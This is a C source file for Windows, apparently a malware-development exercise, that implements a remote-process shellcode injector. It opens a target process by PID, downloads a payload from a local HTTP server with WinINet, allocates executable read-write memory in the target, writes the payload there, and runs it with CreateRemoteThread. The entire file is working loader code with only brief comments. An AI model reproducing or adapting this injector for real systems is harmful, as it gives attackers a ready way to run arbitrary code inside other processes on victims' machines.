#include<windows.h>
#include <wininet.h>
#include<important.h>

 

int main(int argc, char** argv) {

	/*
	
	declare all the variables that will be neeed
	opening a process
	allocation a buffer for that process! 
	create a connection to internet
	fetching a file 
	reading and saving it in a buffer
	create thread for the buffer
	execution the thread 
	
	*/

	HANDLE hProcess = NULL, hThread = NULL;
	LPVOID rbuffer = NULL;
	DWORD PID = NULL, TID=NULL;
	HINTERNET hInternet = NULL, hFileHandle = NULL;
	DWORD dwBytesRead = NULL;
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	SIZE_T sSize = NULL; // Used as the total payload size
	PBYTE pBytes = NULL; // Used as the total payload heap buffer
	PBYTE pTmpBytes = NULL; // Used as the temp buffer of size 1024 bytes
	SIZE_T CHECK = NULL;

	if (argc < 2) {
		warn("enter the pid of the process !");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
	if (hProcess == NULL) {
		warn("Failed to open the file!");
		return EXIT_FAILURE;
	}


	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		warn("InternetOpenW Failed With Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}
	// Opening a handle to the payload's URL
	hFileHandle = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hFileHandle == NULL) {
		warn("[InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);  // #define LPTR   (LMEM_FIXED | LMEM_ZEROINIT)  
	if (pTmpBytes == NULL) {
		return EXIT_FAILURE;
	}

	while (TRUE) {
		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hFileHandle, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return EXIT_FAILURE;
			
		}
		// Updating the size of the total buffer
		sSize += dwBytesRead;
		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL) { // first time read upto 1024
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
		pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		if (pBytes == NULL) {
				return EXIT_FAILURE;
		}
		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);
		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop
		if (dwBytesRead < 1024) {
			break;
		}
		// Otherwise, read the next 1024 bytes
	}

		// Clean up
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hFileHandle);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	
	info("Payload fetched\n");
	for (int i = 0; i < sSize; i += 15) {
		printf("\t");
		for (int j = 0; j < 15 && (i + j) < sSize; j++) {
			printf("%02x ", (unsigned char)pBytes[i + j]);
		}
		printf("\n");
	}

	rbuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[*] Successfully Allocated the %u-bytes with the rwx privledges\n", sSize);
	
	if (rbuffer == NULL) {
		warn("Failed to allocated the buffer memory! : %ld", GetLastError());
		return EXIT_FAILURE;
	}

	// writting the shellcode into that virtual memory !
	WriteProcessMemory(hProcess, rbuffer, pBytes, sSize, &CHECK);
	if (CHECK == NULL) {
		warn("failed to write in the memory error code : %ld", GetLastError());
		return EXIT_FAILURE;
	}
	
	LocalFree(pTmpBytes);
	LocalFree(pBytes);

	// create thread to run our payload
	hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rbuffer,
		NULL,
		0,
		&TID
	);

	if (hThread == NULL) {
		warn("[*] faild to get a handle to the thread , error : %ld", GetLastError());
		CloseHandle(hProcess);
		return  EXIT_FAILURE;
	}
	info("[^] got a handle to the thread  %ld and handle %p", TID, hThread);

	WaitForSingleObject(hThread, INFINITE);
	info("[*] Thread finished execution!\n");
	CloseHandle(hProcess);
	CloseHandle(hThread);
	okay(" finished goodbye !");
	return EXIT_SUCCESS;
}

